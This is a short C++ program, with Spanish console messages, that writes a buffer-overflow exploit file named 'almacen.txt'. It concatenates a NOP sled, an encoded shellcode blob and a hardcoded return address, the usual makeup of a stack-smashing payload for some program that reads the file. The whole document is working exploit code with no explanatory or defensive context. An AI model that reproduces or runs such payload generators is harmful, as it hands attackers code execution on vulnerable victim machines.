#include <cstdlib>
#include <iostream>
#include <fstream>
using namespace std;


char nops[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90";

char shellcode[] =
  "\xd9\xc9\xd9\x74\x24\xf4\xb8\xba\xb2\x07\x97\x5b\x2b\xc9"
"\xb1\x33\x83\xeb\xfc\x31\x43\x13\x03\xf9\xa1\xe5\x62\x01"
"\x2d\x60\x8c\xf9\xae\x13\x04\x1c\x9f\x01\x72\x55\xb2\x95"
"\xf0\x3b\x3f\x5d\x54\xaf\xb4\x13\x71\xc0\x7d\x99\xa7\xef"
"\x7e\x2f\x68\xa3\xbd\x31\x14\xb9\x91\x91\x25\x72\xe4\xd0"
"\x62\x6e\x07\x80\x3b\xe5\xba\x35\x4f\xbb\x06\x37\x9f\xb0"
"\x37\x4f\x9a\x06\xc3\xe5\xa5\x56\x7c\x71\xed\x4e\xf6\xdd"
"\xce\x6f\xdb\x3d\x32\x26\x50\xf5\xc0\xb9\xb0\xc7\x29\x88"
"\xfc\x84\x17\x25\xf1\xd5\x50\x81\xea\xa3\xaa\xf2\x97\xb3"
"\x68\x89\x43\x31\x6d\x29\x07\xe1\x55\xc8\xc4\x74\x1d\xc6"
"\xa1\xf3\x79\xca\x34\xd7\xf1\xf6\xbd\xd6\xd5\x7f\x85\xfc"
"\xf1\x24\x5d\x9c\xa0\x80\x30\xa1\xb3\x6c\xec\x07\xbf\x9e"
"\xf9\x3e\xe2\xf4\xfc\xb3\x98\xb1\xff\xcb\xa2\x91\x97\xfa"
"\x29\x7e\xef\x02\xf8\x3b\x1f\x49\xa1\x6d\x88\x14\x33\x2c"
"\xd5\xa6\xe9\x72\xe0\x24\x18\x0a\x17\x34\x69\x0f\x53\xf2"
"\x81\x7d\xcc\x97\xa5\xd2\xed\xbd\xc5\xb5\x7d\x5d\x24\x50"
"\x06\xc4\x38";

char ret[] = "\xA8\xFB\x22\x00";

int main(){

cout << "Creando exploit\n\n";
ofstream fichero;
fichero.open("almacen.txt");
fichero << nops << shellcode << ret ;
fichero.close();
cout << "ya esta!!!";
return 0;
}

